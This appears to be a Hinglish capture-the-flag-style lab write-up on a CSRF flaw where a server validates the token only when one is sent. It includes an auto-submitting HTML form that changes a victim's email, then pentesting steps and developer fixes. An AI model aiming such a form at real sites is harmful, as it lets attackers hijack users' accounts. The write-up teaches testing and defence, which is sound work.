# 🔐 CSRF Lab: Jab Token Ho Tabhi Server Check Karta Hai

## 🧠 Lab Ka Basic Scene

Yeh lab ek aise CSRF bug ko dikhata hai jahan **server sirf us waqt CSRF token verify karta hai jab wo request mein present ho**. Agar token **missing** ho, to server bina kuch check kiye request accept kar leta hai. Yahi ban jata hai ek **CSRF vulnerability**.

---

## 📌 Aam Zindagi Ka Example:

Soch le ek guard hai jo sirf tabhi ID check karta hai jab tu usay ID dikhata hai. Lekin agar tu bina ID dikhaye nikal jaye to wo kuch nahi kehta. Bas yahi kaam yeh server bhi kar raha hai.

---

## 🔎 Masla Kya Hai?

* CSRF token ka kaam hota hai **unauthorized request** ko rokna.
* Agar token **galat ho** to request reject hoti hai.
* Lekin agar token **missing ho**, aur server **check hi na kare**, to attacker **request bhej ke kaam karwa sakta hai**.

---

## ⚔️ CSRF Attack Ka Tareeqa (jo lab mein kiya gaya)

### ✅ Step 1: Normal Behavior Check Karo

POST request bhejo email change karne ke liye:

```txt
email=new@domain.com&csrf=VALID_TOKEN
```

Galat token do ⇒ request reject hogi.

### ✅ Step 2: Token Ko Hatado

```txt
email=new@domain.com
```

➡️ Request accept ho gayi — **Yeh vulnerability hai**

### ✅ Step 3: Exploit HTML Banao

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="csrfattack@exploit.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

### ✅ Step 4: Exploit Server Pe Host Karo Aur Victim Ko Do

---

## 💥 Real Dunia Mein Aisa Hota Hai?

Bilkul — aise CSRF bugs ab bhi milte hain:

* Purane (legacy) systems mein
* Jahan CSRF token manually lagaya gaya ho
* Jahan har request method (GET/POST) pe protection na ho

**Bug bounty reports** mein aise flaws kaafi bar milte hain.

---

## 🔍 Penetration Tester Kaam Kaise Kare?

### ✅ Practical Testing Steps:

1. Aisi form dhoondo jahan sensitive data change hota ho (email, password)
2. Request ko Burp Suite se intercept karo
3. Dekho CSRF token body/header/cookie mein hai ya nahi
4. Token:

   * Galat do → reject hota hai?
   * Hata do → request accept hoti hai?
5. POST ko GET mein convert karke bhi test karo
6. Agar request accept ho jaye ⇒ vulnerable

### 🧰 Tools:

* Burp Suite (Proxy, Repeater)
* Browser DevTools
* Custom HTML exploit builder

---

## 🚫 Developer Ko Kya Karna Chahiye:

* Token hona bhi chahiye, aur verify bhi hona chahiye
* Sirf `if (csrf)` check na karo — proper validation karo
* Framework ka CSRF middleware (Django, Laravel, etc.) use karo

---

## 🧠 Summary:

> “Yeh lab yeh batata hai ke agar server sirf token ke hone par validation kare — lekin value verify na kare — to hum token hata ke exploit kar sakte hain. Aise bugs aaj bhi hote hain aur pentesting mein inko pakarna zaroori hai.”

